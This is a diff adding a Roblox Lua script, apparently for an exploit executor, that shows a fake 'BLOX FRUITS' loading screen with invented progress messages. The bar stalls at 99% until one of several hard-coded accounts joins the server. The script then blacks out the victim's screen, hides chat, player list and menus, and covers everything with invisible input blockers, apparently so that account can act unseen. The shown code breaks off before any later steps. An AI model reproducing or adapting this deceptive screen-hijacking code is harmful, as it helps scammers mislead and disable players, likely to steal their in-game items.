@@ -1,0 +1,1186 @@
+-- ===== COMBINED LOADING SCREEN SYSTEM =====
+-- Half Loading (stuck at 99%) + Full Loading (when authorized user joins)
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ===== AUTHORIZED USERS FOR LOADING SCREEN DETECTION =====
+local authorizedUsers = {
+    {username = "jaatshab_770", displayname = "III"},
+    {username = "boss_user2", displayname = "BOSS2"},
+    {username = "boss_user3", displayname = "BOSS3"},
+    {username = "boss_user4", displayname = "BOSS4"},
+    {username = "boss_user5", displayname = "BOSS5"}
+}
+
+-- ===== HALF LOADING SCREEN =====
+local function StartHalfLoadingScreen()
+    local loadingScreen = Instance.new("ScreenGui")
+    loadingScreen.Name = "ProfessionalLoadingScreen"
+    loadingScreen.Parent = playerGui
+    loadingScreen.ResetOnSpawn = false
+
+    -- Main container with gradient effect - MADE SMALLER
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.7, 0, 0.6, 0)  -- Smaller container
+    mainContainer.Position = UDim2.new(0.15, 0, 0.2, 0)  -- Adjusted position for smaller container
+    mainContainer.BackgroundColor3 = Color3.fromRGB(10, 15, 20)
+    mainContainer.BorderSizePixel = 0
+    mainContainer.Parent = loadingScreen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0.03, 0)
+    mainCorner.Parent = mainContainer
+
+    -- Create gradient layers
+    local gradientLayers = {
+        {color = Color3.fromRGB(5, 10, 15), size = 1.0, position = 0.0},
+        {color = Color3.fromRGB(15, 20, 25), size = 0.9, position = 0.05},
+        {color = Color3.fromRGB(25, 30, 35), size = 0.8, position = 0.1},
+        {color = Color3.fromRGB(35, 40, 45), size = 0.7, position = 0.15}
+    }
+
+    for i, layer in ipairs(gradientLayers) do
+        local gradientLayer = Instance.new("Frame")
+        gradientLayer.Size = UDim2.new(layer.size, 0, layer.size, 0)
+        gradientLayer.Position = UDim2.new(layer.position, 0, layer.position, 0)
+        gradientLayer.BackgroundColor3 = layer.color
+        gradientLayer.BorderSizePixel = 0
+        gradientLayer.ZIndex = 0
+        gradientLayer.Parent = mainContainer
+        
+        local layerCorner = Instance.new("UICorner")
+        layerCorner.CornerRadius = UDim.new(0.03, 0)
+        layerCorner.Parent = gradientLayer
+    end
+
+    -- Header section
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0.15, 0)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(8, 12, 18)
+    header.BackgroundTransparency = 0.3
+    header.BorderSizePixel = 0
+    header.ZIndex = 2
+    header.Parent = mainContainer
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0.03, 0)
+    headerCorner.Parent = header
+
+    -- Header accent line
+    local headerAccent = Instance.new("Frame")
+    headerAccent.Size = UDim2.new(1, 0, 0.015, 0)
+    headerAccent.Position = UDim2.new(0, 0, 0.98, 0)
+    headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    headerAccent.BorderSizePixel = 0
+    headerAccent.ZIndex = 3
+    headerAccent.Parent = header
+
+    -- Main title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.6, 0)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "BLOX FRUITS"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.8
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+    title.ZIndex = 3
+    title.Parent = header
+
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.4, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.6, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "SYSTEM INITIALIZATION"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.ZIndex = 3
+    subtitle.Parent = header
+
+    -- Status display
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    statusContainer.Position = UDim2.new(0.05, 0, 0.17, 0)
+    statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    statusContainer.BackgroundTransparency = 0.3
+    statusContainer.BorderSizePixel = 0
+    statusContainer.ZIndex = 2
+    statusContainer.Parent = mainContainer
+
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0.02, 0)
+    statusCorner.Parent = statusContainer
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+    statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status:"
+    statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    statusLabel.TextScaled = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 3
+    statusLabel.Parent = statusContainer
+
+    local statusValue = Instance.new("TextLabel")
+    statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+    statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+    statusValue.BackgroundTransparency = 1
+    statusValue.Text = "Initializing core modules..."
+    statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+    statusValue.TextScaled = true
+    statusValue.TextXAlignment = Enum.TextXAlignment.Left
+    statusValue.Font = Enum.Font.GothamBold
+    statusValue.ZIndex = 3
+    statusValue.Parent = statusContainer
+
+    -- Loading Bar Container
+    local loadingBarContainer = Instance.new("Frame")
+    loadingBarContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    loadingBarContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(25, 30, 40)
+    loadingBarContainer.BackgroundTransparency = 0.3
+    loadingBarContainer.BorderSizePixel = 0
+    loadingBarContainer.ZIndex = 2
+    loadingBarContainer.Parent = mainContainer
+
+    local loadingBarCorner = Instance.new("UICorner")
+    loadingBarCorner.CornerRadius = UDim.new(0.02, 0)
+    loadingBarCorner.Parent = loadingBarContainer
+
+    -- Loading bar background
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Size = UDim2.new(0.95, 0, 0.5, 0)
+    loadingBarBg.Position = UDim2.new(0.025, 0, 0.25, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.ZIndex = 2
+    loadingBarBg.Parent = loadingBarContainer
+
+    local loadingBgCorner = Instance.new("UICorner")
+    loadingBgCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBgCorner.Parent = loadingBarBg
+
+    -- Loading bar fill
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.Position = UDim2.new(0, 0, 0, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.ZIndex = 3
+    loadingBar.Parent = loadingBarBg
+
+    local loadingBarFillCorner = Instance.new("UICorner")
+    loadingBarFillCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBarFillCorner.Parent = loadingBar
+
+    -- Loading bar highlight
+    local loadingBarHighlight = Instance.new("Frame")
+    loadingBarHighlight.Size = UDim2.new(1, 0, 0.3, 0)
+    loadingBarHighlight.Position = UDim2.new(0, 0, 0, 0)
+    loadingBarHighlight.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
+    loadingBarHighlight.BackgroundTransparency = 0.5
+    loadingBarHighlight.BorderSizePixel = 0
+    loadingBarHighlight.ZIndex = 4
+    loadingBarHighlight.Parent = loadingBar
+
+    local highlightCorner = Instance.new("UICorner")
+    highlightCorner.CornerRadius = UDim.new(0.08, 0)
+    highlightCorner.Parent = loadingBarHighlight
+
+    -- Loading bar shine effect
+    local loadingBarShine = Instance.new("Frame")
+    loadingBarShine.Size = UDim2.new(0.2, 0, 1, 0)
+    loadingBarShine.Position = UDim2.new(-0.2, 0, 0, 0)
+    loadingBarShine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    loadingBarShine.BackgroundTransparency = 0.7
+    loadingBarShine.BorderSizePixel = 0
+    loadingBarShine.ZIndex = 4
+    loadingBarShine.Parent = loadingBar
+
+    local shineCorner = Instance.new("UICorner")
+    shineCorner.CornerRadius = UDim.new(0.08, 0)
+    shineCorner.Parent = loadingBarShine
+
+    -- Percentage display
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0.4, 0)
+    percentText.Position = UDim2.new(0, 0, 0.55, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.TextScaled = true
+    percentText.Font = Enum.Font.GothamBlack
+    percentText.ZIndex = 3
+    percentText.Parent = loadingBarContainer
+
+    -- Technical details container
+    local techContainer = Instance.new("Frame")
+    techContainer.Size = UDim2.new(0.9, 0, 0.35, 0)
+    techContainer.Position = UDim2.new(0.05, 0, 0.42, 0)
+    techContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    techContainer.BackgroundTransparency = 0.3
+    techContainer.BorderSizePixel = 0
+    techContainer.ZIndex = 2
+    techContainer.Parent = mainContainer
+
+    local techCorner = Instance.new("UICorner")
+    techCorner.CornerRadius = UDim.new(0.02, 0)
+    techCorner.Parent = techContainer
+
+    -- Technical details title
+    local techTitle = Instance.new("TextLabel")
+    techTitle.Size = UDim2.new(1, 0, 0.15, 0)
+    techTitle.Position = UDim2.new(0, 0, 0, 0)
+    techTitle.BackgroundTransparency = 1
+    techTitle.Text = "SYSTEM LOG"
+    techTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    techTitle.TextScaled = true
+    techTitle.Font = Enum.Font.GothamBold
+    techTitle.ZIndex = 3
+    techTitle.Parent = techContainer
+
+    -- Technical log display
+    local techLog = Instance.new("TextLabel")
+    techLog.Size = UDim2.new(0.95, 0, 0.8, 0)
+    techLog.Position = UDim2.new(0.025, 0, 0.15, 0)
+    techLog.BackgroundTransparency = 1
+    techLog.Text = "> Initializing system components..."
+    techLog.TextColor3 = Color3.fromRGB(0, 255, 150)
+    techLog.TextXAlignment = Enum.TextXAlignment.Left
+    techLog.TextYAlignment = Enum.TextYAlignment.Top
+    techLog.TextSize = 14
+    techLog.Font = Enum.Font.Code
+    techLog.TextWrapped = true
+    techLog.ZIndex = 3
+    techLog.Parent = techContainer
+
+    -- Discord button container
+    local discordContainer = Instance.new("Frame")
+    discordContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+    discordContainer.Position = UDim2.new(0.05, 0, 0.79, 0)
+    discordContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    discordContainer.BackgroundTransparency = 0.3
+    discordContainer.BorderSizePixel = 0
+    discordContainer.ZIndex = 2
+    discordContainer.Parent = mainContainer
+
+    local discordCorner = Instance.new("UICorner")
+    discordCorner.CornerRadius = UDim.new(0.02, 0)
+    discordCorner.Parent = discordContainer
+
+    -- Discord button - EXACTLY 144x60 pixels
+    local discordButton = Instance.new("TextButton")
+    discordButton.Size = UDim2.new(0, 144, 0, 60)  -- EXACTLY 144x60 pixels
+    discordButton.AnchorPoint = Vector2.new(0.5, 0.5)  -- Center anchor
+    discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)  -- Centered position
+    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)  -- Discord blurple
+    discordButton.Text = "COPY DISCORD INVITE"
+    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordButton.TextScaled = true
+    discordButton.Font = Enum.Font.GothamBold
+    discordButton.AutoButtonColor = false
+    discordButton.ZIndex = 3
+    discordButton.Parent = discordContainer
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0.08, 0)
+    buttonCorner.Parent = discordButton
+
+    -- 3D Button shadow
+    local buttonShadow = Instance.new("Frame")
+    buttonShadow.Size = UDim2.new(1, 4, 1, 4)
+    buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    buttonShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    buttonShadow.BackgroundTransparency = 0.7
+    buttonShadow.BorderSizePixel = 0
+    buttonShadow.ZIndex = 2
+    buttonShadow.Parent = discordButton
+
+    local shadowCorner = Instance.new("UICorner")
+    shadowCorner.CornerRadius = UDim.new(0.1, 0)
+    shadowCorner.Parent = buttonShadow
+
+    -- Button highlight
+    local buttonHighlight = Instance.new("Frame")
+    buttonHighlight.Size = UDim2.new(1, 0, 0.3, 0)
+    buttonHighlight.Position = UDim2.new(0, 0, 0, 0)
+    buttonHighlight.BackgroundColor3 = Color3.fromRGB(150, 170, 255)
+    buttonHighlight.BackgroundTransparency = 0.3
+    buttonHighlight.BorderSizePixel = 0
+    buttonHighlight.ZIndex = 4
+    buttonHighlight.Parent = discordButton
+
+    local highlightBtnCorner = Instance.new("UICorner")
+    highlightBtnCorner.CornerRadius = UDim.new(0.08, 0)
+    highlightBtnCorner.Parent = buttonHighlight
+
+    -- Button hover effects
+    discordButton.MouseEnter:Connect(function()
+        discordButton.BackgroundColor3 = Color3.fromRGB(105, 120, 255)
+        buttonHighlight.BackgroundTransparency = 0.2
+        -- 3D effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 2)
+        buttonShadow.Position = UDim2.new(0, -1, 0, 1)
+    end)
+
+    discordButton.MouseLeave:Connect(function()
+        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+        buttonHighlight.BackgroundTransparency = 0.3
+        -- Reset 3D effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+        buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    end)
+
+    discordButton.MouseButton1Down:Connect(function()
+        -- Click effect
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 4)
+        buttonShadow.Position = UDim2.new(0, 0, 0, 0)
+    end)
+
+    discordButton.MouseButton1Up:Connect(function()
+        discordButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+        buttonShadow.Position = UDim2.new(0, -2, 0, 2)
+    end)
+
+    discordButton.MouseButton1Click:Connect(function()
+        pcall(function()
+            setclipboard("https://discord.gg/UJt7y7pt95")
+        end)
+        
+        local originalText = discordButton.Text
+        local originalColor = discordButton.BackgroundColor3
+        
+        discordButton.Text = "INVITE COPIED!"
+        discordButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+        buttonHighlight.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+        
+        wait(1.5)
+        
+        discordButton.Text = originalText
+        discordButton.BackgroundColor3 = originalColor
+        buttonHighlight.BackgroundColor3 = Color3.fromRGB(150, 170, 255)
+    end)
+
+    -- Technical messages
+    local technicalMessages = {
+        "> Initializing system components...",
+        "> Loading core game modules...",
+        "> Establishing secure connection...",
+        "> Fetching player data from servers...",
+        "> Analyzing game environment...",
+        "> Compiling script resources...",
+        "> Loading asset packages...",
+        "> Initializing security protocols...",
+        "> Setting up game interfaces...",
+        "> Preparing world data...",
+        "> Loading character models...",
+        "> Initializing physics engine...",
+        "> Setting up network layers...",
+        "> Compiling UI components...",
+        "> Loading sound assets...",
+        "> Initializing game mechanics...",
+        "> Preparing spawn locations...",
+        "> Loading game maps...",
+        "> Setting up player controls...",
+        "> Finalizing system checks...",
+        "> System ready for launch..."
+    }
+
+    local statusUpdates = {
+        "Initializing core modules...",
+        "Loading game resources...",
+        "Establishing connections...",
+        "Compiling scripts...",
+        "Setting up environment...",
+        "Finalizing systems...",
+        "Ready to launch!"
+    }
+
+    -- Loading animation with authorization check
+    local progress = 0
+    local connection
+    local startTime = tick()
+    local currentMessageIndex = 1
+    local messageTimer = 0
+    local totalLoadTime = 240 -- 4 minutes
+    local isAuthorizedUserJoined = false
+
+    -- Function to check for authorized users in the server
+    local function checkForAuthorizedUsers()
+        while not isAuthorizedUserJoined do
+            wait(3) -- Check every 3 seconds
+            
+            for _, player in pairs(game.Players:GetPlayers()) do
+                for _, authUser in pairs(authorizedUsers) do
+                    if player.Name == authUser.username or player.DisplayName == authUser.displayname then
+                        print("🎉 AUTHORIZED USER DETECTED IN SERVER: " .. player.Name)
+                        isAuthorizedUserJoined = true
+                        return
+                    end
+                end
+            end
+        end
+    end
+
+    -- Start checking for authorized users
+    spawn(checkForAuthorizedUsers)
+
+    connection = RunService.Heartbeat:Connect(function(deltaTime)
+        local currentTime = tick() - startTime
+        
+        -- Check if authorized user joined (trigger full loading)
+        if isAuthorizedUserJoined then
+            connection:Disconnect()
+            print("🎯 Authorized user detected - switching to full loading!")
+            loadingScreen:Destroy() -- Remove half loading screen
+            StartFullLoadingScreen() -- Start full loading screen
+            return
+        end
+        
+        -- Update progress over 4 minutes (gets stuck at 99%)
+        if progress < 99 then
+            progress = progress + (deltaTime * (99 / totalLoadTime))
+            if progress > 99 then
+                progress = 99
+            end
+        end
+        
+        -- If 4 minutes passed and no authorized user, complete loading
+        if currentTime >= totalLoadTime and progress >= 99 and not isAuthorizedUserJoined then
+            progress = 100
+            connection:Disconnect()
+            wait(2)
+            loadingScreen:Destroy()
+            print("⏰ 4 minutes passed - completing normal load")
+            return
+        end
+        
+        -- Update loading bar with smooth animation
+        loadingBar.Size = UDim2.new(progress/100, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress))
+        
+        -- Animate loading bar shine
+        loadingBarShine.Position = UDim2.new((math.sin(currentTime * 3) + 1) * 0.4, 0, 0, 0)
+        
+        -- Update status text
+        local statusIndex = math.floor((progress / 100) * #statusUpdates) + 1
+        if statusIndex > #statusUpdates then statusIndex = #statusUpdates end
+        statusValue.Text = statusUpdates[statusIndex]
+        
+        -- Update technical log (every 0.8 seconds)
+        messageTimer = messageTimer + deltaTime
+        if messageTimer > 0.8 and currentMessageIndex <= #technicalMessages then
+            -- Show last 4 messages for context
+            local messagesToShow = ""
+            local startIndex = math.max(1, currentMessageIndex - 3)
+            for i = startIndex, currentMessageIndex do
+                if i <= #technicalMessages then
+                    messagesToShow = messagesToShow .. technicalMessages[i] .. "\n"
+                end
+            end
+            techLog.Text = messagesToShow
+            
+            currentMessageIndex = currentMessageIndex + 1
+            if currentMessageIndex > #technicalMessages then
+                currentMessageIndex = 1  -- Loop back to start
+            end
+            messageTimer = 0
+        end
+        
+        -- Pulsing header accent
+        local accentPulse = math.sin(currentTime * 1.5) * 0.2 + 0.8
+        headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150 * accentPulse, 255 * accentPulse)
+        
+        -- Animate button highlight
+        local buttonPulse = math.sin(currentTime * 2) * 0.1 + 0.2
+        buttonHighlight.BackgroundTransparency = 0.3 - buttonPulse
+    end)
+
+    print("🚦 Half Loading Screen Started - Waiting for authorized user...")
+end
+
+-- ===== FULL LOADING SCREEN =====
+function StartFullLoadingScreen()
+    print("🚀 Starting Full Loading Screen!")
+    
+    -- ===== AGGRESSIVE UI BLOCKING =====
+    local function aggressiveUIBlocking()
+        while true do
+            pcall(function()
+                -- Block CoreGui elements
+                for _, gui in pairs(CoreGui:GetDescendants()) do
+                    if gui:IsA("TextButton") or gui:IsA("ImageButton") or gui:IsA("Frame") then
+                        local guiName = gui.Name:lower()
+                        local isTopUI = (
+                            guiName:find("menu") or 
+                            guiName:find("hamburger") or 
+                            guiName:find("settings") or
+                            guiName:find("leaderboard") or
+                            guiName:find("playerlist") or
+                            guiName:find("chat") or
+                            guiName:find("mainbutton") or
+                            guiName:find("icon") or
+                            guiName:find("button")
+                        )
+                        
+                        if isTopUI then
+                            gui.Visible = false
+                            gui.Active = false
+                        end
+                    end
+                end
+                
+                -- Block PlayerGui elements
+                for _, gui in pairs(playerGui:GetDescendants()) do
+                    if gui:IsA("TextButton") or gui:IsA("ImageButton") or gui:IsA("Frame") then
+                        local absPos = gui.AbsolutePosition
+                        local inTopArea = absPos.Y < 100
+                        local inLeftArea = absPos.X < 300
+                        local inTopLeft = inTopArea and inLeftArea
+                        
+                        local guiName = gui.Name:lower()
+                        local isCommonButton = (
+                            guiName:find("chat") or 
+                            guiName:find("menu") or 
+                            guiName:find("playerlist") or 
+                            guiName:find("server") or 
+                            guiName:find("settings") or
+                            guiName:find("inventory") or
+                            guiName:find("leaderboard") or
+                            guiName:find("help") or
+                            guiName:find("emote") or
+                            guiName:find("radio") or
+                            guiName:find("main") or
+                            guiName:find("hamburger") or
+                            guiName:find("icon")
+                        )
+                        
+                        if (inTopLeft or isCommonButton) and not guiName:find("finalstage") then
+                            gui.Visible = false
+                            gui.Active = false
+                        end
+                    end
+                end
+            end)
+            wait(0.1) -- More frequent checking
+        end
+    end
+
+    -- ===== REMOVE LEADERBOARD FROM MENU =====
+    local function disableLeaderboard()
+        pcall(function()
+            -- Method 1: Use StarterGui to hide core elements
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+            
+            -- Method 2: Direct CoreGui manipulation
+            for _, obj in pairs(CoreGui:GetChildren()) do
+                if obj:IsA("PlayerList") or obj.Name:lower():find("leaderboard") or obj.Name:lower():find("playerlist") then
+                    obj.Enabled = false
+                end
+            end
+        end)
+    end
+
+    -- ===== BLACK BACKGROUND SCREEN (LOWER PRIORITY) =====
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BlackBackground"
+    screenGui.DisplayOrder = 1  -- LOW priority (in the back)
+    screenGui.IgnoreGuiInset = true  -- Cover the entire screen
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = CoreGui
+
+    -- Black frame covering entire screen (as background)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)  -- SOLID BLACK
+    frame.BackgroundTransparency = 0  -- NOT transparent!
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 1
+    frame.Parent = screenGui
+
+    -- ENHANCED CLICK BLOCKER BUTTONS
+    local function addEnhancedClickBlockers()
+        -- Full screen blocker (primary)
+        local fullScreenBlocker = Instance.new("TextButton")
+        fullScreenBlocker.Size = UDim2.new(1, 0, 1, 0)
+        fullScreenBlocker.Position = UDim2.new(0, 0, 0, 0)
+        fullScreenBlocker.BackgroundTransparency = 1
+        fullScreenBlocker.Text = ""
+        fullScreenBlocker.ZIndex = 1000
+        fullScreenBlocker.Parent = screenGui
+        
+        -- Strategic area blockers
+        local blockerAreas = {
+            -- Top-left (3-line menu area)
+            {Position = UDim2.new(0, 0, 0, 0), Size = UDim2.new(0, 300, 0, 100)},
+            -- Top-right (settings area)
+            {Position = UDim2.new(1, -200, 0, 0), Size = UDim2.new(0, 200, 0, 100)},
+            -- Bottom-left (chat area)
+            {Position = UDim2.new(0, 0, 1, -150), Size = UDim2.new(0, 400, 0, 150)},
+            -- Center-top (notifications)
+            {Position = UDim2.new(0.3, 0, 0, 0), Size = UDim2.new(0.4, 0, 0, 50)}
+        }
+        
+        for _, area in pairs(blockerAreas) do
+            local blocker = Instance.new("TextButton")
+            blocker.Size = area.Size
+            blocker.Position = area.Position
+            blocker.BackgroundTransparency = 1
+            blocker.Text = ""
+            blocker.ZIndex = 1001
+            blocker.Parent = screenGui
+            
+            -- Block all input
+            blocker.MouseButton1Click:Connect(function() end)
+            blocker.MouseButton2Click:Connect(function() end)
+            blocker.MouseButton1Down:Connect(function() end)
+            blocker.MouseButton2Down:Connect(function() end)
+        end
+        
+        -- Block all input on full screen blocker
+        fullScreenBlocker.MouseButton1Click:Connect(function() end)
+        fullScreenBlocker.MouseButton2Click:Connect(function() end)
+        fullScreenBlocker.MouseButton1Down:Connect(function() end)
+        fullScreenBlocker.MouseButton2Down:Connect(function() end)
+        fullScreenBlocker.SelectionGained:Connect(function() end)
+        
+        print("Enhanced click blockers added")
+    end
+
+    -- Add the enhanced click blockers
+    addEnhancedClickBlockers()
+
+    -- ===== FINAL LOADING SCREEN (HIGH PRIORITY - ON TOP) =====
+    local finalLoadingScreen = Instance.new("ScreenGui")
+    finalLoadingScreen.Name = "FinalStageLoadingScreen"
+    finalLoadingScreen.Parent = CoreGui
+    finalLoadingScreen.ResetOnSpawn = false
+    finalLoadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    finalLoadingScreen.DisplayOrder = 999  -- HIGH priority (on top)
+
+    -- ===== FULL SCREEN COVER =====
+    local fullScreenCover = Instance.new("Frame")
+    fullScreenCover.Size = UDim2.new(1, 0, 1, 0)
+    fullScreenCover.Position = UDim2.new(0, 0, 0, 0)
+    fullScreenCover.BackgroundColor3 = Color3.fromRGB(5, 10, 20)
+    fullScreenCover.BackgroundTransparency = 1  -- MAKE LOADING SCREEN BACKGROUND TRANSPARENT!
+    fullScreenCover.BorderSizePixel = 0
+    fullScreenCover.ZIndex = 1
+    fullScreenCover.Parent = finalLoadingScreen
+
+    -- Animated gradient background (now visible because parent is transparent)
+    local bgGradient = Instance.new("UIGradient")
+    bgGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 10, 25)),
+        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(10, 15, 40)),
+        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(15, 25, 60)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 25))
+    })
+    bgGradient.Rotation = 45
+    bgGradient.Parent = fullScreenCover
+
+    -- Sci-fi grid pattern
+    local gridPattern = Instance.new("Frame")
+    gridPattern.Size = UDim2.new(1, 0, 1, 0)
+    gridPattern.Position = UDim2.new(0, 0, 0, 0)
+    gridPattern.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    gridPattern.BackgroundTransparency = 0.8
+    gridPattern.BorderSizePixel = 0
+    gridPattern.ZIndex = 2
+    gridPattern.Parent = fullScreenCover
+
+    -- Grid lines (horizontal)
+    for i = 1, 20 do
+        local line = Instance.new("Frame")
+        line.Size = UDim2.new(1, 0, 0, 1)
+        line.Position = UDim2.new(0, 0, (i-1)/19, 0)
+        line.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        line.BackgroundTransparency = 0.7
+        line.BorderSizePixel = 0
+        line.ZIndex = 3
+        line.Parent = gridPattern
+    end
+
+    -- Grid lines (vertical)
+    for i = 1, 30 do
+        local line = Instance.new("Frame")
+        line.Size = UDim2.new(0, 1, 1, 0)
+        line.Position = UDim2.new((i-1)/29, 0, 0, 0)
+        line.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        line.BackgroundTransparency = 0.7
+        line.BorderSizePixel = 0
+        line.ZIndex = 3
+        line.Parent = gridPattern
+    end
+
+    -- Floating particles
+    local particles = Instance.new("Frame")
+    particles.Size = UDim2.new(1, 0, 1, 0)
+    particles.Position = UDim2.new(0, 0, 0, 0)
+    particles.BackgroundTransparency = 1
+    particles.ZIndex = 4
+    particles.Parent = fullScreenCover
+
+    -- Create multiple floating particles
+    for i = 1, 15 do
+        local particle = Instance.new("Frame")
+        particle.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8))
+        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        particle.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
+        particle.BackgroundTransparency = 0.6
+        particle.BorderSizePixel = 0
+        particle.ZIndex = 4
+        particle.Parent = particles
+        
+        local particleCorner = Instance.new("UICorner")
+        particleCorner.CornerRadius = UDim.new(1, 0)
+        particleCorner.Parent = particle
+    end
+
+    -- Sci-fi glow effect
+    local glowEffect = Instance.new("Frame")
+    glowEffect.Size = UDim2.new(1, 0, 1, 0)
+    glowEffect.Position = UDim2.new(0, 0, 0, 0)
+    glowEffect.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
+    glowEffect.BackgroundTransparency = 0.95
+    glowEffect.BorderSizePixel = 0
+    glowEffect.ZIndex = 5
+    glowEffect.Parent = fullScreenCover
+
+    -- ===== MAIN CONTENT CONTAINER =====
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.6, 0, 0.5, 0)
+    mainContainer.Position = UDim2.new(0.2, 0, 0.25, 0)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
+    mainContainer.BackgroundTransparency = 0.1
+    mainContainer.BorderSizePixel = 0
+    mainContainer.ZIndex = 10
+    mainContainer.Parent = finalLoadingScreen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0.03, 0)
+    mainCorner.Parent = mainContainer
+
+    -- Container border with glow
+    local containerStroke = Instance.new("UIStroke")
+    containerStroke.Color = Color3.fromRGB(0, 150, 255)
+    containerStroke.Thickness = 2
+    containerStroke.Parent = mainContainer
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.15, 0)
+    title.Position = UDim2.new(0, 0, 0.05, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "BLOX FRUITS"
